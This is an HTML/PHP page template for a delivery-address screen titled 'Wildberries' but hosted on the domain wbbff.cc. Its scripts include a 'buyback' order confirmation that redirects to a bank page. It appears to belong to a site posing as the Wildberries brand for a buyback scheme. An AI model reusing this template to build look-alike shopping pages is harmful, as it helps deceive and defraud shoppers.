<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" class="pixel-ratio-2 retina"><head><style>:root {

--image-path: url('<?php echo asset("/assets/foot_nav.png")?>');
--image-path2: url('<?php echo asset("/assets/dd_icon.png")?>');
}</style>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
<title>Адреса доставки - Wildberries</title>
<meta name="keywords" content="Платформа обратного выкупа для российских торговцев">
<meta name="description" content="Коллекции женской, мужской и детской одежды, обуви, а также товары для дома и спорта. Информация о доставке и оплате. Таблицы размеров, советы по уходу за вещами.">
<meta name="format-detection" content="telephone=no">
<link rel="shortcut icon" type="image/ico" href="https://wbbff.cc/favicon.ico">
<link type="text/css" rel="stylesheet" href="<?php echo asset("assets/style.css")?>">
<script type="text/javascript" src="<?php echo asset("assets/jquery.js")?>"></script>
<script type="text/javascript" src="<?php echo asset("assets/global.js")?>"></script>
<script type="text/javascript" src="<?php echo asset("assets/arttpl.js")?>"></script>
<link href="<?php echo asset("assets/layer.css")?>" type="text/css" rel="styleSheet" id="layermcss"></head>
<body><div class="pagetop">
	<div class="fh"><a href="<?php  echo route("profile") ?>"></a></div>
	<div>Адреса доставки</div>
		<!-- <div class="cd"><a href="javascript:top_menu();"></a></div> -->
	<!-- 
<div class="top_menu" id="top_menu">
	<ul>
	<li><a href="<?php  echo route("index") ?>"><i class="top_tb1"></i><span>Главная</span></a></li>
	<li><a href="https://wbbff.cc/index.php/category/list"><i class="top_tb2"></i><span>Каталог</span></a></li>
	<li><a href="<?php  echo route("cart") ?>"><i class="top_tb3"></i><span>Корзина</span></a></li>
	<li><a href="<?php  echo route("profile") ?>"><i class="top_tb4"></i><span>Профиль</span></a></li>
	</ul>
	<div class="clear"></div>
</div> --></div>
<div class="content" style="margin-bottom:75px;">
			<div class="user_box_zh mat10 pageid" style="border-bottom:0">
		<div class="add_list">
			<span class="fl">fdfads</span>
			<span class="fr">794****2441</span>
			<div class="clear"></div>
			<div class="mat5">
				<span class="cred">[по умолчанию]</span>				<span class="c999">   fasdfa</span>
			</div>
			<div class="xian"></div>
			<div class="fr mat10">
				<a href="https://wbbff.cc/user.php?mod=useraddr&amp;act=edit&amp;id=833" class="edit_btn mar10">изменить</a>
				<a href="https://wbbff.cc/user.php?mod=useraddr&amp;act=del&amp;id=833&amp;token=75236c7c5fdf7ebfe3441c02863d0cb8" onclick="return app_delinfo(this, 'Удалить этот адрес')" class="edit_btn">удалить</a>
				<div class="clear"></div>
			</div>
			<div class="clear"></div>
		</div>
	</div>
		<div class="fenye mab10"></div>
</div>
<div class="fb_btn1"><a href="https://wbbff.cc/user.php?mod=useraddr&amp;act=add">Добавить новый адрес</a></div>
<link rel="stylesheet" href="<?php echo asset("assets/weui.min.css")?>">
<link rel="stylesheet" href="<?php echo asset("assets/jquery-weui.min.css")?>">
<script src="<?php echo asset("assets/jquery-weui.js")?>"></script>
<script type="text/javascript" src="<?php echo asset("assets/layer.js")?>"></script>
<script type="text/javascript" src="<?php echo asset("assets/app.js")?>"></script>
<script type="text/javascript">
//顶部菜单点击
function top_menu() {
	if ($("#top_menu").is(":hidden")) {
		$("#top_menu").show();
	}
	else {
		$("#top_menu").hide();	
	}
	$("#top_menu a").live("click", function(){
		$("#top_menu").hide();
	})
}
pe_loadscript("https://wbbff.cc/api.php?mod=cron");
</script>
<script>
function confirm_huigou(order_id){
    layer.open({
		content: "Определить выкуп этого Заказ？",
		btn: ["OK", "Отмена"],
		shadeClose: false,
		yes: function() {
		    
			/*layer.open({
				content: '你点了确认',
				time: 1
			});*/
			$.ajax({
                type:"POST",
                url:"./user.php?mod=order&act=huigou_do",
                dataType:"json",
                data:{
                    'order_id':order_id,
                },
                success:function(res){
                    console.log(res);

                    if (res.result == false) {
	                    layer.open({
	    						content: res.msg,
	    						time: 3,
	    						skin: 'msg',
	    						end: function () { 
								location.href='./user.php?mod=userbank';
	    						}
	    					});
                    }else{
	                    layer.open({
	    						content: res.msg,
	    						time: 2,
	    						skin: 'msg',
	    						end: function () { 
									location.reload();
	    						}
	    					});
                    }
                }
            });
		}

	});
}    
</script>

</body></html>